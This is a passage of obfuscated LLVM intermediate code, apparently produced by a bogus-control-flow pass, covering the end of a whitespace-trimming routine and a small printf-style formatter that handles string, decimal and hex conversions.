  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %126
  %135 = load i8*, i8** %2, align 8
  %136 = load i32, i32* %3, align 4
  %137 = load i32, i32* %4, align 4
  %138 = sub nsw i32 %136, %137
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i8, i8* %135, i64 %139
  store i8 0, i8* %140, align 1
  %141 = load i32, i32* @x.3
  %142 = load i32, i32* @y.4
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart228, label %originalBB17alteredBB

originalBBpart228:                                ; preds = %originalBB17
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %149 = load i8*, i8** %2, align 8
  %150 = load i32, i32* %4, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds i8, i8* %149, i64 %151
  %153 = load i8, i8* %152, align 1
  %154 = sext i8 %153 to i32
  %155 = call i32 @isspace(i32 %154) #10
  %156 = icmp ne i32 %155, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %55
  %157 = load i32, i32* %5, align 4
  %158 = load i32, i32* %4, align 4
  %159 = icmp sge i32 %157, %158
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %86
  %160 = load i32, i32* %5, align 4
  %_ = shl i32 %160, -1
  %_11 = sub i32 0, %160
  %gen = add i32 %_11, -1
  %_12 = sub i32 %160, -1
  %gen13 = mul i32 %_12, -1
  %161 = add nsw i32 %160, -1
  store i32 %161, i32* %5, align 4
  br label %originalBB10

originalBB17alteredBB:                            ; preds = %originalBB17, %126
  %162 = load i8*, i8** %2, align 8
  %163 = load i32, i32* %3, align 4
  %164 = load i32, i32* %4, align 4
  %_18 = sub i32 %163, %164
  %gen19 = mul i32 %_18, %164
  %_20 = sub i32 %163, %164
  %gen21 = mul i32 %_20, %164
  %_22 = shl i32 %163, %164
  %_23 = sub i32 %163, %164
  %gen24 = mul i32 %_23, %164
  %_25 = sub i32 %163, %164
  %gen26 = mul i32 %_25, %164
  %165 = sub nsw i32 %163, %164
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds i8, i8* %162, i64 %166
  store i8 0, i8* %167, align 1
  br label %originalBB17
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %667, %3
  %13 = load i32, i32* @x.7
  %14 = load i32, i32* @y.8
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i8*, i8** %5, align 8
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  %25 = load i32, i32* @x.7
  %26 = load i32, i32* @y.8
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %670

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  br i1 %37, label %38, label %626

; <label>:38:                                     ; preds = %33
  %39 = load i8*, i8** %5, align 8
  %40 = getelementptr inbounds i8, i8* %39, i32 1
  store i8* %40, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %38
  br label %670

; <label>:46:                                     ; preds = %38
  %47 = load i32, i32* @x.7
  %48 = load i32, i32* @y.8
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i8*, i8** %5, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 37
  %59 = load i32, i32* @x.7
  %60 = load i32, i32* @y.8
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %58, label %67, label %68

; <label>:67:                                     ; preds = %originalBBpart24
  br label %643

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 45
  br i1 %72, label %73, label %92

; <label>:73:                                     ; preds = %68
  %74 = load i32, i32* @x.7
  %75 = load i32, i32* @y.8
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i8*, i8** %5, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 1
  store i8* %83, i8** %5, align 8
  store i32 1, i32* %8, align 4
  %84 = load i32, i32* @x.7
  %85 = load i32, i32* @y.8
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %92

; <label>:92:                                     ; preds = %originalBBpart28, %68
  br label %93

; <label>:93:                                     ; preds = %114, %92
  %94 = load i32, i32* @x.7
  %95 = load i32, i32* @y.8
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %93
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 48
  %106 = load i32, i32* @x.7
  %107 = load i32, i32* @y.8
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %105, label %114, label %119

; <label>:114:                                    ; preds = %originalBBpart212
  %115 = load i8*, i8** %5, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %5, align 8
  %117 = load i32, i32* %8, align 4
  %118 = or i32 %117, 2
  store i32 %118, i32* %8, align 4
  br label %93

; <label>:119:                                    ; preds = %originalBBpart212
  br label %120

; <label>:120:                                    ; preds = %141, %119
  %121 = load i8*, i8** %5, align 8
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp sge i32 %123, 48
  br i1 %124, label %125, label %130

; <label>:125:                                    ; preds = %120
  %126 = load i8*, i8** %5, align 8
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp sle i32 %128, 57
  br label %130

; <label>:130:                                    ; preds = %125, %120
  %131 = phi i1 [ false, %120 ], [ %129, %125 ]
  br i1 %131, label %132, label %144

; <label>:132:                                    ; preds = %130
  %133 = load i32, i32* %7, align 4
  %134 = mul nsw i32 %133, 10
  store i32 %134, i32* %7, align 4
  %135 = load i8*, i8** %5, align 8
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = sub nsw i32 %137, 48
  %139 = load i32, i32* %7, align 4
  %140 = add nsw i32 %139, %138
  store i32 %140, i32* %7, align 4
  br label %141

; <label>:141:                                    ; preds = %132
  %142 = load i8*, i8** %5, align 8
  %143 = getelementptr inbounds i8, i8* %142, i32 1
  store i8* %143, i8** %5, align 8
  br label %120

; <label>:144:                                    ; preds = %130
  %145 = load i8*, i8** %5, align 8
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 115
  br i1 %148, label %149, label %215

; <label>:149:                                    ; preds = %144
  %150 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %151 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = icmp ule i32 %152, 40
  br i1 %153, label %154, label %160

; <label>:154:                                    ; preds = %149
  %155 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 3
  %156 = load i8*, i8** %155, align 8
  %157 = getelementptr i8, i8* %156, i32 %152
  %158 = bitcast i8* %157 to i32*
  %159 = add i32 %152, 8
  store i32 %159, i32* %151, align 8
  br label %181

; <label>:160:                                    ; preds = %149
  %161 = load i32, i32* @x.7
  %162 = load i32, i32* @y.8
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %160
  %169 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 2
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to i32*
  %172 = getelementptr i8, i8* %170, i32 8
  store i8* %172, i8** %169, align 8
  %173 = load i32, i32* @x.7
  %174 = load i32, i32* @y.8
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %181

; <label>:181:                                    ; preds = %originalBBpart216, %154
  %182 = phi i32* [ %158, %154 ], [ %171, %originalBBpart216 ]
  %183 = load i32, i32* @x.7
  %184 = load i32, i32* @y.8
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %181
  %191 = load i32, i32* %182, align 4
  %192 = sext i32 %191 to i64
  %193 = inttoptr i64 %192 to i8*
  store i8* %193, i8** %11, align 8
  %194 = load i8**, i8*** %4, align 8
  %195 = load i8*, i8** %11, align 8
  %196 = icmp ne i8* %195, null
  %197 = load i32, i32* @x.7
  %198 = load i32, i32* @y.8
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %196, label %205, label %207

; <label>:205:                                    ; preds = %originalBBpart220
  %206 = load i8*, i8** %11, align 8
  br label %208

; <label>:207:                                    ; preds = %originalBBpart220
  br label %208

; <label>:208:                                    ; preds = %207, %205
  %209 = phi i8* [ %206, %205 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), %207 ]
  %210 = load i32, i32* %7, align 4
  %211 = load i32, i32* %8, align 4
  %212 = call i32 @prints(i8** %194, i8* %209, i32 %210, i32 %211)
  %213 = load i32, i32* %9, align 4
  %214 = add nsw i32 %213, %212
  store i32 %214, i32* %9, align 4
  br label %667

; <label>:215:                                    ; preds = %144
  %216 = load i8*, i8** %5, align 8
  %217 = load i8, i8* %216, align 1
  %218 = zext i8 %217 to i32
  %219 = icmp eq i32 %218, 100
  br i1 %219, label %220, label %277

; <label>:220:                                    ; preds = %215
  %221 = load i32, i32* @x.7
  %222 = load i32, i32* @y.8
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %220
  %229 = load i8**, i8*** %4, align 8
  %230 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %231 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = icmp ule i32 %232, 40
  %234 = load i32, i32* @x.7
  %235 = load i32, i32* @y.8
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %233, label %242, label %248

; <label>:242:                                    ; preds = %originalBBpart224
  %243 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 3
  %244 = load i8*, i8** %243, align 8
  %245 = getelementptr i8, i8* %244, i32 %232
  %246 = bitcast i8* %245 to i32*
  %247 = add i32 %232, 8
  store i32 %247, i32* %231, align 8
  br label %253

; <label>:248:                                    ; preds = %originalBBpart224
  %249 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 2
  %250 = load i8*, i8** %249, align 8
  %251 = bitcast i8* %250 to i32*
  %252 = getelementptr i8, i8* %250, i32 8
  store i8* %252, i8** %249, align 8
  br label %253

; <label>:253:                                    ; preds = %248, %242
  %254 = phi i32* [ %246, %242 ], [ %251, %248 ]
  %255 = load i32, i32* @x.7
  %256 = load i32, i32* @y.8
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %253
  %263 = load i32, i32* %254, align 4
  %264 = load i32, i32* %7, align 4
  %265 = load i32, i32* %8, align 4
  %266 = call i32 @printi(i8** %229, i32 %263, i32 10, i32 1, i32 %264, i32 %265, i32 97)
  %267 = load i32, i32* %9, align 4
  %268 = add nsw i32 %267, %266
  store i32 %268, i32* %9, align 4
  %269 = load i32, i32* @x.7
  %270 = load i32, i32* @y.8
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBBpart234, label %originalBB26alteredBB

originalBBpart234:                                ; preds = %originalBB26
  br label %667

; <label>:277:                                    ; preds = %215
  %278 = load i8*, i8** %5, align 8
  %279 = load i8, i8* %278, align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 120
  br i1 %281, label %282, label %355

; <label>:282:                                    ; preds = %277
  %283 = load i8**, i8*** %4, align 8
  %284 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %285 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 8
  %287 = icmp ule i32 %286, 40
  br i1 %287, label %288, label %310

; <label>:288:                                    ; preds = %282
  %289 = load i32, i32* @x.7
  %290 = load i32, i32* @y.8
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %288
  %297 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %284, i32 0, i32 3
  %298 = load i8*, i8** %297, align 8
  %299 = getelementptr i8, i8* %298, i32 %286
  %300 = bitcast i8* %299 to i32*
  %301 = add i32 %286, 8
  store i32 %301, i32* %285, align 8
  %302 = load i32, i32* @x.7
  %303 = load i32, i32* @y.8
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBBpart242, label %originalBB36alteredBB

originalBBpart242:                                ; preds = %originalBB36
  br label %331

; <label>:310:                                    ; preds = %282
  %311 = load i32, i32* @x.7
  %312 = load i32, i32* @y.8
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %310
  %319 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %284, i32 0, i32 2
  %320 = load i8*, i8** %319, align 8
  %321 = bitcast i8* %320 to i32*
  %322 = getelementptr i8, i8* %320, i32 8
  store i8* %322, i8** %319, align 8
  %323 = load i32, i32* @x.7
  %324 = load i32, i32* @y.8
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %331

; <label>:331:                                    ; preds = %originalBBpart246, %originalBBpart242
  %332 = phi i32* [ %300, %originalBBpart242 ], [ %321, %originalBBpart246 ]
  %333 = load i32, i32* @x.7
  %334 = load i32, i32* @y.8
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %331
  %341 = load i32, i32* %332, align 4
  %342 = load i32, i32* %7, align 4
  %343 = load i32, i32* %8, align 4
  %344 = call i32 @printi(i8** %283, i32 %341, i32 16, i32 0, i32 %342, i32 %343, i32 97)
  %345 = load i32, i32* %9, align 4
  %346 = add nsw i32 %345, %344
  store i32 %346, i32* %9, align 4
  %347 = load i32, i32* @x.7
  %348 = load i32, i32* @y.8
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart258, label %originalBB48alteredBB

originalBBpart258:                                ; preds = %originalBB48
  br label %667

; <label>:355:                                    ; preds = %277
  %356 = load i8*, i8** %5, align 8
  %357 = load i8, i8* %356, align 1
  %358 = zext i8 %357 to i32
  %359 = icmp eq i32 %358, 88
  br i1 %359, label %360, label %433

; <label>:360:                                    ; preds = %355
  %361 = load i8**, i8*** %4, align 8
  %362 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %363 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %362, i32 0, i32 0
  %364 = load i32, i32* %363, align 8
  %365 = icmp ule i32 %364, 40
  br i1 %365, label %366, label %388

; <label>:366:                                    ; preds = %360
  %367 = load i32, i32* @x.7
  %368 = load i32, i32* @y.8
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %366
  %375 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %362, i32 0, i32 3
  %376 = load i8*, i8** %375, align 8
  %377 = getelementptr i8, i8* %376, i32 %364
  %378 = bitcast i8* %377 to i32*
  %379 = add i32 %364, 8
  store i32 %379, i32* %363, align 8
  %380 = load i32, i32* @x.7
  %381 = load i32, i32* @y.8
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart265, label %originalBB60alteredBB

originalBBpart265:                                ; preds = %originalBB60
  br label %409

; <label>:388:                                    ; preds = %360
  %389 = load i32, i32* @x.7
  %390 = load i32, i32* @y.8
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %388
  %397 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %362, i32 0, i32 2
  %398 = load i8*, i8** %397, align 8
  %399 = bitcast i8* %398 to i32*
  %400 = getelementptr i8, i8* %398, i32 8
  store i8* %400, i8** %397, align 8
  %401 = load i32, i32* @x.7
  %402 = load i32, i32* @y.8
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %409

; <label>:409:                                    ; preds = %originalBBpart269, %originalBBpart265
  %410 = phi i32* [ %378, %originalBBpart265 ], [ %399, %originalBBpart269 ]
  %411 = load i32, i32* @x.7
  %412 = load i32, i32* @y.8
  %413 = sub i32 %411, 1
  %414 = mul i32 %411, %413
  %415 = urem i32 %414, 2
  %416 = icmp eq i32 %415, 0
  %417 = icmp slt i32 %412, 10
  %418 = or i1 %416, %417
  br i1 %418, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %409
  %419 = load i32, i32* %410, align 4
  %420 = load i32, i32* %7, align 4
  %421 = load i32, i32* %8, align 4
  %422 = call i32 @printi(i8** %361, i32 %419, i32 16, i32 0, i32 %420, i32 %421, i32 65)
  %423 = load i32, i32* %9, align 4
  %424 = add nsw i32 %423, %422
  store i32 %424, i32* %9, align 4
  %425 = load i32, i32* @x.7
  %426 = load i32, i32* @y.8
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart281, label %originalBB71alteredBB

originalBBpart281:                                ; preds = %originalBB71
  br label %667

; <label>:433:                                    ; preds = %355
  %434 = load i32, i32* @x.7
  %435 = load i32, i32* @y.8
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %433
  %442 = load i8*, i8** %5, align 8
  %443 = load i8, i8* %442, align 1
  %444 = zext i8 %443 to i32
  %445 = icmp eq i32 %444, 117
  %446 = load i32, i32* @x.7
  %447 = load i32, i32* @y.8
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br i1 %445, label %454, label %527

; <label>:454:                                    ; preds = %originalBBpart285
  %455 = load i32, i32* @x.7
  %456 = load i32, i32* @y.8
  %457 = sub i32 %455, 1
  %458 = mul i32 %455, %457
  %459 = urem i32 %458, 2
  %460 = icmp eq i32 %459, 0
  %461 = icmp slt i32 %456, 10
  %462 = or i1 %460, %461
  br i1 %462, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %454
  %463 = load i8**, i8*** %4, align 8
  %464 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %465 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %464, i32 0, i32 0
  %466 = load i32, i32* %465, align 8
  %467 = icmp ule i32 %466, 40
  %468 = load i32, i32* @x.7
  %469 = load i32, i32* @y.8
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br i1 %467, label %476, label %498

; <label>:476:                                    ; preds = %originalBBpart289
  %477 = load i32, i32* @x.7
  %478 = load i32, i32* @y.8
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %476
  %485 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %464, i32 0, i32 3
  %486 = load i8*, i8** %485, align 8
  %487 = getelementptr i8, i8* %486, i32 %466
  %488 = bitcast i8* %487 to i32*
  %489 = add i32 %466, 8
  store i32 %489, i32* %465, align 8
  %490 = load i32, i32* @x.7
  %491 = load i32, i32* @y.8
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart296, label %originalBB91alteredBB

originalBBpart296:                                ; preds = %originalBB91
  br label %519

; <label>:498:                                    ; preds = %originalBBpart289
  %499 = load i32, i32* @x.7
  %500 = load i32, i32* @y.8
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %498
  %507 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %464, i32 0, i32 2
  %508 = load i8*, i8** %507, align 8
  %509 = bitcast i8* %508 to i32*
  %510 = getelementptr i8, i8* %508, i32 8
  store i8* %510, i8** %507, align 8
  %511 = load i32, i32* @x.7
  %512 = load i32, i32* @y.8
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %519

; <label>:519:                                    ; preds = %originalBBpart2100, %originalBBpart296
